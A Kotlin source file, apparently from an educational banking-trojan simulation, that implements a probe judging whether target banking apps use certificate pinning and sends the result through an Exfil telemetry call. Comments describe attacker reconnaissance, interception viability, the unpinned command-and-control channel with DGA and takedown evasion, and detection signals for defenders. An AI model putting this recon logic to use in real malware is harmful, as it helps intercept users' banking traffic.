package com.docreader.lite.reader.advanced

import com.docreader.lite.reader.Exfil

/**
 * Certificate pinning probe — target-app perspective (attacker recon).
 *
 * Banker operates from BOTH sides of cert pinning:
 *
 * ATTACKER SIDE (this module):
 *   - Banker does NOT pin its own C2 (see ANALYSIS.md §6 anti-pattern)
 *   - Banker probes whether TARGET banking apps pin their API connections
 *   - If target pins: overlay credential capture still works (overlay is UI-level,
 *     not network-level) but MITM of target's API traffic fails
 *   - If target doesn't pin: attacker can MITM target's API traffic on
 *     compromised device (install CA cert → read all traffic)
 *
 * DEFENDER SIDE:
 *   - Banking app should pin its API servers
 *   - OkHttp CertificatePinner / Network Security Config / TrustManager
 *   - Banker malware benefits from targets NOT pinning (can MITM)
 *
 * Detection: an app probing other apps' network_security_config.xml or
 * inspecting OkHttp CertificatePinner patterns in decompiled code =
 * reconnaissance signal.
 *
 * This module demonstrates:
 *   1. What the attacker looks for when assessing target pinning
 *   2. How the attacker's OWN C2 intentionally skips pinning
 *   3. Why the asymmetry exists (DGA + cert rotation makes pinning infeasible for C2)
 */
object CertPinnerProbe {

    // Indicators that a target app uses cert pinning
    private val PINNING_INDICATORS = listOf(
        "CertificatePinner",                    // OkHttp
        "network_security_config",              // Android NSC
        "TrustManagerFactory",                  // Custom TrustManager
        "X509TrustManager",                     // Custom trust validation
        "ssl_pinning",                          // Generic
        "certificate-transparency",             // CT enforcement
        "sha256/",                              // Pin hash format
        "pin-sha256",                           // HPKP-style pin
    )

    // Common OkHttp pinning pattern:
    // CertificatePinner.Builder()
    //   .add("api.bank.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    //   .build()

    data class PinningAssessment(
        val targetPackage: String,
        val hasPinning: Boolean,
        val pinningType: String?,   // "okhttp", "nsc", "custom_trustmanager", null
        val mitmViable: Boolean,    // Can attacker MITM this target?
        val recommendation: String, // "overlay_only", "mitm_possible", "unknown"
    )

    /**
     * Assess target app's cert pinning posture.
     *
     * In practice, banker does this via:
     *   1. Static: decompile target APK, grep for pinning indicators
     *   2. Dynamic: try MITM with installed CA cert, observe SSLHandshakeException
     *   3. Config: check res/xml/network_security_config.xml in target APK
     *
     * This method simulates the assessment logic.
     */
    fun assessTarget(targetPackage: String, indicators: List<String>): PinningAssessment {
        var pinningType: String? = null

        for (indicator in indicators) {
            val lower = indicator.lowercase()
            when {
                lower.contains("certificatepinner") -> pinningType = "okhttp"
                lower.contains("network_security_config") -> pinningType = "nsc"
                lower.contains("trustmanager") -> pinningType = "custom_trustmanager"
            }
            if (pinningType != null) break
        }

        val hasPinning = pinningType != null
        val mitmViable = !hasPinning
        val recommendation = when {
            !hasPinning -> "mitm_possible"
            pinningType == "nsc" -> "overlay_only"  // NSC is hardest to bypass at runtime
            else -> "overlay_only"
        }

        val result = PinningAssessment(
            targetPackage = targetPackage,
            hasPinning = hasPinning,
            pinningType = pinningType,
            mitmViable = mitmViable,
            recommendation = recommendation,
        )

        Exfil.event("pinning_probe",
            "target" to targetPackage,
            "has_pinning" to hasPinning.toString(),
            "type" to (pinningType ?: "none"),
            "mitm_viable" to mitmViable.toString()
        )

        return result
    }

    /**
     * Why banker's OWN C2 is intentionally unpinned.
     *
     * Technical reasons:
     *   1. DGA domains resolve to different IPs weekly — no stable cert to pin
     *   2. C2 servers use Let's Encrypt / self-signed certs that rotate
     *   3. Operator rotates infrastructure frequently (LEA takedown evasion)
     *   4. Pinning own C2 = if pin breaks, entire botnet goes dark
     *   5. MITM of C2 by analysts is acceptable risk vs botnet resilience
     *
     * This is the §6 asymmetry from ANALYSIS.md:
     *   Target app SHOULD pin (defenders add pinning)
     *   Banker C2 CANNOT pin (operational necessity)
     *   Result: analyst can MITM banker C2 traffic trivially
     */
    val C2_PINNING_RATIONALE = """
        Banker intentionally does NOT pin C2 connections because:
        - DGA-resolved domains have unpredictable certificates
        - Infrastructure rotates frequently (takedown evasion)
        - Pinning failure = entire botnet unreachable
        - Analyst MITM of C2 is acceptable tradeoff for resilience

        This asymmetry is operationally exploitable by defenders:
        mount mitmproxy with self-signed cert → banker accepts it →
        full C2 protocol visible in plaintext.
    """.trimIndent()
}
